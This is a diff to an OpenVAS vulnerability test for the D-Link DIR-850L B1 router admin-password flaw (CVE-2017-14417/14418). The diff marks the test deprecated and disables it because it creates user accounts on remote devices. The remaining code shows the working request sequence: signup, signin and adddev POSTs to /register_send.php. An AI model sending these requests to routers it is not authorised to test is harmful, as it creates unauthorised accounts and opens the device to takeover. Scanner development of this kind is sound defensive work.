@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dlink_dir850l_B1_mul_vul_remote.nasl 8586 2018-01-30 14:08:56Z cfischer $
+# $Id: gb_dlink_dir850l_B1_mul_vul_remote.nasl 9111 2018-03-15 15:16:12Z cfischer $
 #
 # D-Link 850L Firmware B1 Admin Password Disclosure Vulnerability (remote)
 #
@@ -27,9 +27,9 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.107243");
-  script_version("$Revision: 8586 $");
+  script_version("$Revision: 9111 $");
   script_cve_id("CVE-2017-14417", "CVE-2017-14418");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-30 15:08:56 +0100 (Tue, 30 Jan 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-03-15 16:16:12 +0100 (Thu, 15 Mar 2018) $");
   script_tag(name:"creation_date", value:"2017-09-12 17:47:21 +0200 (Tue, 12 Sep 2017)");
 
   script_tag(name:"cvss_base", value:"7.5");
@@ -60,9 +60,13 @@ gain control of the device. This webpage is used to register the device to the m
 
   script_dependencies("gb_dlink_dir_detect.nasl");
   script_mandatory_keys("host_is_dlink_dir", "dlink_hw_version");
+  
+  script_tag(name:"deprecated", value:TRUE);
 
   exit(0);
 }
+
+exit(66); # We shouldn't create user accounts on remote devices...
 
 include("host_details.inc");
 include("http_func.inc");
@@ -73,18 +77,16 @@ if(!Port = get_kb_item("dlink_dir_port")){
   exit(0);
 }
 
-if (!type = get_kb_item("dlink_typ")){
+if(!type = get_kb_item("dlink_typ")){
   exit(0);
 }
 
-if (!hw_version = get_kb_item("dlink_hw_version")){
+if(!hw_version = get_kb_item("dlink_hw_version")){
   exit(0);
 }
-
 
 if (type == "DIR-850L" && (hw_version == "B1" ))
 {
-
   url = '/register_send.php';
 
   user_name = rand_str(charset:"abcdefghijklmnopqrstuvwxyz", length:10) + "@" + rand_str(charset:"abcdefghijklmnopqrstuvwxyz", length:5) + ".com";
@@ -93,45 +95,30 @@ if (type == "DIR-850L" && (hw_version == "B1" ))
   firstname = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
   lastname = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_", length:10);
 
-
   data = 'act=signup&lang=en&outemail=' + user_name + '&passwd=' + password + '&firstname=' + firstname + '&lastname=' + lastname;
-
   req = http_post_req(port:Port, url:url, data:data, add_headers: make_array("Connection", "Keep-Alive", "Content-Type", "application/x-www-form-urlencoded"));
-
   res = http_keepalive_send_recv(port: Port, data: req);
 
   if (res =~ "HTTP/1.. 200 OK" && egrep(pattern:"<result>success</result>", string:res))
   {
      data = 'act=signin&lang=en&outemail=' + user_name + '&passwd=' + password + '&firstname=' + firstname + '&lastname=' + lastname;
-
      req = http_post_req(port:Port, url:url, data:data, add_headers: make_array("Connection", "Keep-Alive", "Content-Type", "application/x-www-form-urlencoded"));
-
      res = http_keepalive_send_recv(port: Port, data: req);
 
      if (res =~ "HTTP/1.. 200 OK" && egrep(pattern:"<result>success</result>", string:res))
      {
-
         data = 'act=adddev&lang=en';
-
         req = http_post_req(port:Port, url:url, data:data, add_headers: make_array("Connection", "Keep-Alive", "Content-Type", "application/x-www-form-urlencoded"));
-
         res = http_keepalive_send_recv(port: Port, data: req);
 
         if (res =~ "HTTP/1.. 200 OK" && egrep(pattern:"<result>success</result>", string:res))
         {
-
             report = "It was possible to sign up and sign in with the credentials " + user_name + ":" + password + " and add the device to this account, this can be further used to gain the admin password. It is recommended to stop using this product immediately as there is no solution available yet. ";
-
             security_message(data:report);
             exit( 0 );
-
         }
-
      }
-
   }
-
 }
 
 exit ( 99 );
-
